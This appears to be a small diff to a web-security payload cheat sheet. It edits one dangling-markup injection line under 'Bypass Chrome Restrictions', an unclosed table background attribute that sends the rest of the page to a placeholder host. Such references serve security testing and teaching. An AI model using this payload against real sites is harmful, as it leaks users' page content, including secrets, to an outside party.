@@ -23,5 +23,5 @@
 
 Bypass Chrome Restrictions:
 ```html
-<table background='//endpoint?data'
+<table background='//endpoint?data=
 ```
